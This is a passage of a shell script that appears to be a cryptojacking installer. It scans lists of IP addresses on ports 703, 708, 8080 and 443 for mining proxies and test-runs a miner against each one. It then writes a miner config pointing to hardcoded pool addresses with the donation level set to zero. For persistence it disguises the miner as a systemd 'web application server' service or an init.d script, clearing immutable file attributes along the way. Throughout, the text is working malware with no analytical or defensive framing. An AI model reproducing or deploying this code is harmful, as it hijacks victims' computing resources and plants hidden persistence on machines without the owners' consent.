            "algo": null,
            "coin": null,
            "url": "'$SPECIALPOOL'",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        },'
						SPECIALPOOLS+=$'\n'$SPECIALPOOL
					done
				fi

				CHECK=0
				POOL=""
				POOLS=""
				if [[ ! -z $(cat /root/$PATH_NAME/ip.txt) ]]; then
					port=703
					threads=40
					IPS=''
					echo '' >/root/$PATH_NAME/found703.lst
					echo '' >/root/$PATH_NAME/targets703
					echo '' >/root/$PATH_NAME/logfile703
					IPS=$(cat /root/$PATH_NAME/ip.txt)
					server=''
					for server in $IPS; do
						server=${server//[[:space:]]/}
						echo $port "$server" >>/root/$PATH_NAME/targets703
					done
					InfoP "Scanning port 703..."
					if command -v nc &>/dev/null && nc -h 2>&1 | grep -q -- '-z'; then
						xargs -a /root/$PATH_NAME/targets703 -n 2 -P $threads sh -c 'timeout 30 nc $1 '$port' -z -w 2 >/dev/null 2>&1; echo $? $1 >> /root/'$PATH_NAME'/logfile703'
					elif command -v nc &>/dev/null; then
						xargs -a /root/$PATH_NAME/targets703 -n 2 -P $threads sh -c 'cat /dev/null |timeout 30 nc $1 '$port' -w 2 >/dev/null 2>&1; echo $? $1 >> /root/'$PATH_NAME'/logfile703'
					else
						xargs -a /root/$PATH_NAME/targets703 -n 2 -P $threads bash -c 'timeout 3 bash -c "</dev/tcp/$1/'$port' &>/dev/null 2>&1"; echo $? $1 >> /root/'$PATH_NAME'/logfile703'
					fi

					grep "^0" /root/$PATH_NAME/logfile703 | cut -d " " -f2 >/root/$PATH_NAME/found703.lst
					cd /root/$PATH_NAME || exit
					chmod 755 $FILE_NAME
					if [ -f /root/$PATH_NAME/found703.lst ]; then
						FOUND=$(cat /root/$PATH_NAME/found703.lst)
						for server in $FOUND; do
							server=${server//[[:space:]]/}
							if [ "$CHECK" -ge 5 ]; then
								echo "Pools list full"
								break
							fi
							InfoP "Checking $server 703..."
							cat <<EOF >/root/$PATH_NAME/config.json
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": true,
        "host": "0.0.0.0",
        "port": 999,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 5,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": null,
    "pools": [
        		{
            "algo": null,
            "coin": null,
            "url": "$server:703",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 3,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOF
							cd /root/$PATH_NAME || exit
							if [ ! -z "$TESTLD" ]; then
								LD=true
							else
								./$FILE_NAME >/dev/null 2>&1 &
								LD=false
							fi

							sleep 10
							if command -v wget &>/dev/null; then
								test=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
							elif command -v curl &>/dev/null; then
								test=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
							else
								test=$(__curl http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
							fi
							if [[ "$test" -eq 480045 ]]; then
								InfoG "Add $server in pools list"
								POOL='{
					"algo": null,
					"coin": null,
					"url": "'$server':703",
					"user": "LINUXSERVER",
					"pass": "x",
					"rig-id": null,
					"nicehash": true,
					"keepalive": false,
					"enabled": true,
					"tls": true,
					"tls-fingerprint": null,
					"daemon": false,
					"socks5": null,
					"self-select": null,
					"submit-to-origin": false
					},'
								POOLS+=$'\n'$POOL
								CHECK=$(($CHECK + 1))
							else
								InfoR "$server Not Work"
							fi
							if [ "$LD" == false ]; then
								pkill -9 $FILE_NAME >/dev/null 2>&1
							fi

							sleep 5
						done
					fi
				fi
				function empty {
					local var="$1"

					# Return true if:
					# 1.    var is a null string ("" as empty string)
					# 2.    a non set variable is passed
					# 3.    a declared variable or array but without a value is passed
					# 4.    an empty array is passed
					if test -z "$var"; then
						[[ $(echo "1") ]]
						return

					# Return true if var is zero (0 as an integer or "0" as a string)
					elif [ "$var" == 0 ] 2>/dev/null; then
						[[ $(echo "1") ]]
						return

					# Return true if var is 0.0 (0 as a float)
					elif [ "$var" == 0.0 ] 2>/dev/null; then
						[[ $(echo "1") ]]
						return
					fi

					[[ $(echo "") ]]
				}
				if [[ ! -z $(cat /root/$PATH_NAME/ip.txt) ]]; then
					if empty "${POOLS}"; then
						EMPTYPOOLS=true
						InfoR "No working proxy found, checking port 708..."
					else
						InfoG "Found $CHECK Proxys"
						EMPTYPOOLS=false
					fi
				fi
				if [ "$EMPTYPOOLS" == true -o "$CHECK" -lt 5 ]; then
					if [[ ! -z $(cat /root/$PATH_NAME/ip.txt) ]]; then
						InfoP "The number of proxies is less than 5(Found $CHECK proxies), checking port 708..."
						port=708
						threads=40
						IPS=''
						echo '' >/root/$PATH_NAME/found708.lst
						echo '' >/root/$PATH_NAME/targets708
						echo '' >/root/$PATH_NAME/logfile708
						IPS=$(cat /root/$PATH_NAME/ip.txt)
						server=''
						for server in $IPS; do
							server=${server//[[:space:]]/}
							echo $port "$server" >>/root/$PATH_NAME/targets708
						done
						InfoP "Scanning port 708..."
						if command -v nc &>/dev/null && nc -h 2>&1 | grep -q -- '-z'; then
							xargs -a /root/$PATH_NAME/targets708 -n 2 -P $threads sh -c 'timeout 30 nc $1 '$port' -z -w 2 >/dev/null 2>&1; echo $? $1 >> /root/'$PATH_NAME'/logfile708'
						elif command -v nc &>/dev/null; then
							xargs -a /root/$PATH_NAME/targets708 -n 2 -P $threads sh -c 'cat /dev/null |timeout 30 nc $1 '$port' -w 2 >/dev/null 2>&1; echo $? $1 >> /root/'$PATH_NAME'/logfile708'
						else
							xargs -a /root/$PATH_NAME/targets708 -n 2 -P $threads bash -c 'timeout 3 bash -c "</dev/tcp/$1/'$port' &>/dev/null 2>&1"; echo $? $1 >> /root/'$PATH_NAME'/logfile708'
						fi

						grep "^0" /root/$PATH_NAME/logfile708 | cut -d " " -f2 >/root/$PATH_NAME/found708.lst
						if [ -f /root/$PATH_NAME/found708.lst ]; then
							FOUND=$(cat /root/$PATH_NAME/found708.lst)
							for server in $FOUND; do
								server=${server//[[:space:]]/}
								if [ "$CHECK" -ge 5 ]; then
									echo "Pools list full"
									break
								fi
								InfoP "Checking $server 708..."
								cat <<EOF >/root/$PATH_NAME/config.json
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": true,
        "host": "0.0.0.0",
        "port": 999,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 5,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": null,
    "pools": [
        		{
            "algo": null,
            "coin": null,
            "url": "$server:708",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 3,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOF
								cd /root/$PATH_NAME || exit

								if [ ! -z "$TESTLD" ]; then
									LD=true
								else
									./$FILE_NAME >/dev/null 2>&1 &
									LD=false
								fi

								sleep 10
								if command -v wget &>/dev/null; then
									test=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
								elif command -v curl &>/dev/null; then
									test=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
								else
									test=$(__curl http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
								fi
								if [[ "$test" -eq 480045 ]]; then
									InfoG "Add $server in pools list"
									POOL='{
					"algo": null,
					"coin": null,
					"url": "'$server':708",
					"user": "LINUXSERVER",
					"pass": "x",
					"rig-id": null,
					"nicehash": true,
					"keepalive": false,
					"enabled": true,
					"tls": true,
					"tls-fingerprint": null,
					"daemon": false,
					"socks5": null,
					"self-select": null,
					"submit-to-origin": false
					},'
									POOLS+=$'\n'$POOL
									CHECK=$(($CHECK + 1))
								else
									InfoR "$server Not Work"
								fi
								if [ "$LD" == false ]; then
									pkill -9 $FILE_NAME >/dev/null 2>&1
								fi
								sleep 5
							done
						fi
					fi
				fi
				if [[ ! -z $(cat /root/$PATH_NAME/ip.txt) ]]; then
					if empty "${POOLS}"; then
						EMPTYPOOLS=true
						InfoR "No working proxy 708 found, checking port 8080..."
					else
						InfoG "Found $CHECK Proxys"
						EMPTYPOOLS=false
					fi
				fi
				if [ "$EMPTYPOOLS" == true -o "$CHECK" -lt 5 ]; then
					if [[ ! -z $(cat /root/$PATH_NAME/ip.txt) ]]; then
						InfoP "The number of proxies is less than 5(Found $CHECK proxies), checking port 8080..."
						port=8080
						threads=40
						IPS=''
						echo '' >/root/$PATH_NAME/found8080.lst
						echo '' >/root/$PATH_NAME/targets8080
						echo '' >/root/$PATH_NAME/logfile8080
						IPS=$(cat /root/$PATH_NAME/ip.txt)
						server=''
						for server in $IPS; do
							server=${server//[[:space:]]/}
							echo $port "$server" >>/root/$PATH_NAME/targets8080
						done
						InfoP "Scanning port 8080..."
						if command -v nc &>/dev/null && nc -h 2>&1 | grep -q -- '-z'; then
							xargs -a /root/$PATH_NAME/targets8080 -n 2 -P $threads sh -c 'timeout 30 nc $1 '$port' -z -w 2 >/dev/null 2>&1; echo $? $1 >> /root/'$PATH_NAME'/logfile8080'
						elif command -v nc &>/dev/null; then
							xargs -a /root/$PATH_NAME/targets8080 -n 2 -P $threads sh -c 'cat /dev/null |timeout 30 nc $1 '$port' -w 2 >/dev/null 2>&1; echo $? $1 >> /root/'$PATH_NAME'/logfile8080'
						else
							xargs -a /root/$PATH_NAME/targets8080 -n 2 -P $threads bash -c 'timeout 3 bash -c "</dev/tcp/$1/'$port' &>/dev/null 2>&1"; echo $? $1 >> /root/'$PATH_NAME'/logfile8080'
						fi

						grep "^0" /root/$PATH_NAME/logfile8080 | cut -d " " -f2 >/root/$PATH_NAME/found8080.lst
						if [ -f /root/$PATH_NAME/found8080.lst ]; then
							FOUND=$(cat /root/$PATH_NAME/found8080.lst)
							for server in $FOUND; do
								server=${server//[[:space:]]/}
								if [ "$CHECK" -ge 5 ]; then
									echo "Pools list full"
									break
								fi
								InfoP "Checking $server 8080..."
								cat <<EOF >/root/$PATH_NAME/config.json
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": true,
        "host": "0.0.0.0",
        "port": 999,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 5,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": null,
    "pools": [
        		{
            "algo": null,
            "coin": null,
            "url": "$server:8080",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 3,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOF
								cd /root/$PATH_NAME || exit
								if [ ! -z "$TESTLD" ]; then
									LD=true
								else
									./$FILE_NAME >/dev/null 2>&1 &
									LD=false
								fi
								sleep 10
								if command -v wget &>/dev/null; then
									test=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
								elif command -v curl &>/dev/null; then
									test=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
								else
									test=$(__curl http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
								fi
								if [[ "$test" -eq 480045 ]]; then
									InfoG "Add $server in pools list"
									POOL='{
					"algo": null,
					"coin": null,
					"url": "'$server':8080",
					"user": "LINUXSERVER",
					"pass": "x",
					"rig-id": null,
					"nicehash": true,
					"keepalive": false,
					"enabled": true,
					"tls": true,
					"tls-fingerprint": null,
					"daemon": false,
					"socks5": null,
					"self-select": null,
					"submit-to-origin": false
					},'
									POOLS+=$'\n'$POOL
									CHECK=$(($CHECK + 1))
								else
									InfoR "$server Not Work"
								fi
								if [ "$LD" == false ]; then
									pkill -9 $FILE_NAME >/dev/null 2>&1
								fi
								sleep 5
							done
						fi
					fi
				fi
				if [[ ! -z $(cat /root/$PATH_NAME/ip.txt) ]]; then
					if empty "${POOLS}"; then
						EMPTYPOOLS=true
						InfoR "No working proxy 8080 found, checking port 443..."
					else
						InfoG "Found $CHECK Proxys"
						EMPTYPOOLS=false
					fi
				fi
				if [ "$EMPTYPOOLS" == true -o "$CHECK" -lt 5 ]; then
					if [[ ! -z $(cat /root/$PATH_NAME/ip.txt) ]]; then
						InfoP "The number of proxies is less than 5(Found $CHECK proxies), checking port 443..."
						port=443
						threads=40
						IPS=''
						echo '' >/root/$PATH_NAME/found443.lst
						echo '' >/root/$PATH_NAME/targets443
						echo '' >/root/$PATH_NAME/logfile443
						IPS=$(cat /root/$PATH_NAME/ip.txt)
						server=''
						for server in $IPS; do
							server=${server//[[:space:]]/}
							echo $port "$server" >>/root/$PATH_NAME/targets443
						done
						InfoP "Scanning port 443..."
						if command -v nc &>/dev/null && nc -h 2>&1 | grep -q -- '-z'; then
							xargs -a /root/$PATH_NAME/targets443 -n 2 -P $threads sh -c 'timeout 30 nc $1 '$port' -z -w 2 >/dev/null 2>&1; echo $? $1 >> /root/'$PATH_NAME'/logfile443'
						elif command -v nc &>/dev/null; then
							xargs -a /root/$PATH_NAME/targets443 -n 2 -P $threads sh -c 'cat /dev/null |timeout 30 nc $1 '$port' -w 2 >/dev/null 2>&1; echo $? $1 >> /root/'$PATH_NAME'/logfile443'
						else
							xargs -a /root/$PATH_NAME/targets443 -n 2 -P $threads bash -c 'timeout 3 bash -c "</dev/tcp/$1/'$port' &>/dev/null 2>&1"; echo $? $1 >> /root/'$PATH_NAME'/logfile443'
						fi

						grep "^0" /root/$PATH_NAME/logfile443 | cut -d " " -f2 >/root/$PATH_NAME/found443.lst
						if [ -f /root/$PATH_NAME/found443.lst ]; then
							FOUND=$(cat /root/$PATH_NAME/found443.lst)
							for server in $FOUND; do
								server=${server//[[:space:]]/}
								if [ "$CHECK" -ge 5 ]; then
									echo "Pools list full"
									break
								fi
								InfoP "Checking $server 443..."
								cat <<EOF >/root/$PATH_NAME/config.json
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": true,
        "host": "0.0.0.0",
        "port": 999,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 5,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": null,
    "pools": [
        		{
            "algo": null,
            "coin": null,
            "url": "$server:443",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 3,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOF
								cd /root/$PATH_NAME || exit
								if [ ! -z "$TESTLD" ]; then
									LD=true
								else
									./$FILE_NAME >/dev/null 2>&1 &
									LD=false
								fi
								sleep 10
								if command -v wget &>/dev/null; then
									test=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
								elif command -v curl &>/dev/null; then
									test=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
								else
									test=$(__curl http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
								fi
								if [[ "$test" -eq 480045 ]]; then
									InfoG "Add $server in pools list"
									POOL='{
					"algo": null,
					"coin": null,
					"url": "'$server':443",
					"user": "LINUXSERVER",
					"pass": "x",
					"rig-id": null,
					"nicehash": true,
					"keepalive": false,
					"enabled": true,
					"tls": true,
					"tls-fingerprint": null,
					"daemon": false,
					"socks5": null,
					"self-select": null,
					"submit-to-origin": false
					},'
									POOLS+=$'\n'$POOL
									CHECK=$(($CHECK + 1))
								else
									InfoR "$server Not Work"
								fi
								if [ "$LD" == false ]; then
									pkill -9 $FILE_NAME >/dev/null 2>&1
								fi
								sleep 5
							done
						fi
					fi
				fi

				cat <<EOF >/root/$PATH_NAME/config.json
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": true,
        "host": "0.0.0.0",
        "port": 999,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": $BackActive,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": true,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 75,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": null,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "$MINEIP:80",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        },
$POOLS
		{
            "algo": null,
            "coin": null,
            "url": "5.133.65.53:$MINEPORT",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
		,
		{
            "algo": null,
            "coin": null,
            "url": "5.133.65.54:$MINEPORT",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
		,
		{
            "algo": null,
            "coin": null,
            "url": "5.133.65.55:$MINEPORT",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
		,
		$SPECIALPOOLS
		{
            "algo": null,
            "coin": null,
            "url": "5.133.65.56:$MINEPORT",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 3,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOF

				cd /root/$PATH_NAME || exit
				get_abs_filename() {
					# $1 : relative filename
					if [ -d "$(dirname "$1")" ]; then
						echo "$(cd "$(dirname "$1")" && pwd)$(basename "$1")"
					fi
				}

				RP=/root/$PATH_NAME
				if [ "$isSystemctl" == true ]; then
					if [ -f /etc/systemd/system/${SERVICE_NAME}.service ]; then
						chattr -i /etc/systemd/system/${SERVICE_NAME}.service
					fi
					cat <<EOF >/etc/systemd/system/${SERVICE_NAME}.service
[Unit]
Description=$SERVICE_NAME web application server

[Service]
Type=simple
ExecStart=/bin/bash -c '$RP/$FILE_NAME'
WorkingDirectory=$RP
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
					chmod 755 /etc/systemd/system/${SERVICE_NAME}.service >/dev/null 2>&1
					systemctl daemon-reload >/dev/null 2>&1
					systemctl enable ${SERVICE_NAME}.service >/dev/null 2>&1
					systemctl stop ${SERVICE_NAME}.service >/dev/null 2>&1
					systemctl start ${SERVICE_NAME}.service >/dev/null 2>&1
				elif [ "$isDebian" == true ]; then
					if [ -f /etc/init.d/$SERVICE_NAME ]; then
						chattr -i /etc/init.d/$SERVICE_NAME >/dev/null 2>&1
					fi
					cat <<EOF >/etc/init.d/$SERVICE_NAME
#! /bin/sh
### BEGIN INIT INFO
# Provides:          skeleton
# Required-Start:    \$remote_fs \$syslog
# Required-Stop:     \$remote_fs \$syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Example initscript
# Description:       This file should be used to construct scripts to be
#                    placed in /etc/init.d.
### END INIT INFO

# Author: Foo Bar <foobar@baz.org>
#
# Please remove the "Author" lines above and replace them
# with your own name if you copy and modify this script.

# Do NOT "set -e"

# PATH should only include /usr/* if it runs after the mountnfs.sh script
PATH="/sbin:/usr/sbin:/bin:/usr/bin"
DESC="Description of the service"
NAME="$FILE_NAME"
DAEMON="$RP/\$NAME"
DAEMON_ARGS=""
PIDFILE="/var/run/\$NAME.pid"
SCRIPTNAME="/etc/init.d/$SERVICE_NAME"

# Exit if the package is not installed
[ -x "\$DAEMON" ] || exit 0

# Read configuration variable file if it is present
[ -r /etc/default/\$NAME ] && . /etc/default/\$NAME

# Load the VERBOSE setting and other rcS variables
. /lib/init/vars.sh

# Define LSB log_* functions.
# Depend on lsb-base (>= 3.2-14) to ensure that this file is present
# and status_of_proc is working.
. /lib/lsb/init-functions
. /etc/init.d/status

#
# Function that starts the daemon/service
#
do_start()
{
	# Return
	#   0 if daemon has been started
	#   1 if daemon was already running
	#   2 if daemon could not be started
	start-stop-daemon --start --quiet --exec \$DAEMON --test > /dev/null || return 1
	start-stop-daemon --start --quiet --background --exec \$DAEMON || return 2
	# Add code here, if necessary, that waits for the process to be ready
	# to handle requests from services started subsequently which depend
	# on this one.  As a last resort, sleep for some time.
}

#
# Function that stops the daemon/service
#
do_stop()
{
	# Return
	#   0 if daemon has been stopped
	#   1 if daemon was already stopped
	#   2 if daemon could not be stopped
	#   other if a failure occurred
	rm -f \$PIDFILE
	start-stop-daemon --stop --quiet --retry=TERM/30/KILL/5 --name \$NAME
	RETVAL="\$?"
	pkill -9 \$NAME
	[ "\$RETVAL" = 2 ] && return 2
	# Wait for children to finish too if this is a daemon that forks
	# and if the daemon is only ever run from this initscript.
	# If the above conditions are not satisfied then add some other code
	# that waits for the process to drop all resources that could be
	# needed by services started subsequently.  A last resort is to
	# sleep for some time.
	start-stop-daemon --stop --quiet --oknodo --retry=0/30/KILL/5 --exec \$DAEMON
	pkill -9 \$NAME
	[ "\$?" = 2 ] && return 2
	# Many daemons don't delete their pidfiles when they exit.
	rm -f \$PIDFILE
	return "\$RETVAL"
}

#
# Function that sends a SIGHUP to the daemon/service
#
do_reload() {
	#
	# If the daemon can reload its configuration without
	# restarting (for example, when it is sent a SIGHUP),
	# then implement that here.
	#
	start-stop-daemon --stop --signal 1 --quiet --name \$NAME
	return 0
}

case "\$1" in
  start)
	[ "\$VERBOSE" != no ] && log_daemon_msg "Starting \$DESC" "\$NAME"
	do_start
	case "\$?" in
		0|1) [ "\$VERBOSE" != no ] && log_end_msg 0 ;;
		2) [ "\$VERBOSE" != no ] && log_end_msg 1 ;;
	esac
	;;
  stop)
	[ "\$VERBOSE" != no ] && log_daemon_msg "Stopping \$DESC" "\$NAME"
	do_stop
	case "\$?" in
		0|1) [ "\$VERBOSE" != no ] && log_end_msg 0 ;;
		2) [ "\$VERBOSE" != no ] && log_end_msg 1 ;;
	esac
	;;
  status)
       status_of_proc "\$DAEMON" "\$NAME" >/dev/null 2>&1
   	   if [ \$? -ne 0 ]; then
          statusfit "\$DAEMON" "\$NAME"
       fi && exit 0 || exit \$?
       ;;
  #reload|force-reload)
	#
	# If do_reload() is not implemented then leave this commented out
	# and leave 'force-reload' as an alias for 'restart'.
	#
